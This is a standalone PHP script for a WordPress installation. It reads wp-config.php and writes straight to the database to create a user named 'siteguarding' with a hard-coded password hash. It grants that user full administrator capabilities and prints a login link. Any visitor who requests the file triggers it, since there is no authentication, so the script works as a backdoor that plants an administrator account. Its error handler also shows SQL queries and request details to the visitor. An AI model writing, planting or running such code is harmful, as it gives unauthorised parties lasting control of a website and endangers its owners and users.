<?php


$link_login = 'http://'.$_SERVER['HTTP_HOST'].'/wp-login.php';


echo '<p>Commands: <br><br>
Quick Login: <a href="'.$link_login.'">'.$link_login.'</a> <br><br>
</p>';


include('wp-config.php');

ConnectDB();

$r = mysql_fetch_row( query( "SELECT count(*) FROM ".$table_prefix."users WHERE user_login = 'siteguarding'" ) );
if (intval($r[0]) > 0) 
{
	echo 'User "siteguarding" already exists'; 
	exit();
}


$query = 'INSERT INTO '.$table_prefix.'users (user_login, user_pass, user_nicename, user_email, display_name) VALUES (\'siteguarding\',\'$P$B4mGiYfO3g8uD4FFCiSncwWLP/b/021\', \'siteguarding\', \'team@siteguarding.com\', \'siteguarding\');';
query( $query );

$query = "SELECT ID FROM ".$table_prefix."users WHERE user_login = 'siteguarding' LIMIT 1";
$a = query( $query );
if ($r = mysql_fetch_array( $a ))
{
	$user_id = $r['ID'];
	$query = "INSERT INTO ".$table_prefix."usermeta (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, '".$user_id."', '".$table_prefix."capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}');";
	query( $query );

	$query = "INSERT INTO ".$table_prefix."usermeta (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, '".$user_id."', '".$table_prefix."user_level', '10');";
	query( $query );
	
	$query = "INSERT INTO ".$table_prefix."usermeta (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, '".$user_id."', 'active', '1');";
	query( $query );
	
	echo 'Done';
	exit;
}
else {
	echo 'Cant find siteguarding user account'; 
	exit;
}

function ConnectDB()
{
	$db_host = DB_HOST;
	$db_name = DB_NAME;
	$db_user = DB_USER;
	$db_pass = DB_PASSWORD;

	$db_id = @mysql_connect( $db_host, $db_user, $db_pass );
	mysql_select_db ($db_name);
	if (!$db_id)
	{
        	$m = 'cant connect to DB';
        	echo $m;
	        exit;
	}
}

function query( $sql )
{
         $a = @mysql_query( $sql );

         if ( $e = mysql_errno() )
         {
                 $m = "Time: ".date("H:i:s")."\n";
                 $m .= "SQL query: ".$sql."\n";
                 $m .= "Error: ".mysql_error()."\n";
                 $m .= "Script: ".$_SERVER["SCRIPT_NAME"]."?".$_SERVER['QUERY_STRING']."\n";
                 $m .= "IP: ".$_SERVER['REMOTE_ADDR']."\n";
                 $m .= "HOST: ".$_SERVER['REMOTE_HOST']."\n";
                 $m .= "REFERER: ".$_SERVER['HTTP_REFERER']."\n";
                 
                 echo $m;
                 exit;
         }

         return $a;
}


function SQL_Params_Array($array, $type)
{
	$a = '';

	switch ($type) {

		case 'keys':
			$separator = '';
			foreach ($array as $key => $value) {
		    	$a .= $separator.'`'.$key.'`';
		    	$separator = ',';
			}
			break;


		case 'values':
			$separator = '';
			foreach ($array as $key => $value) {
		    	$a .= $separator."'".addslashes($value)."'";
		    	$separator = ',';
			}
			break;
	}

	return $a;
}

function SQL_Params_Array_Update($array)
{
	$a = '';
	$separator = '';
	foreach ($array as $key => $value) {
    	$a .= $separator."`".$key."` = '".addslashes($value)."'";
    	$separator = ',';
	}

	return $a;
}

?>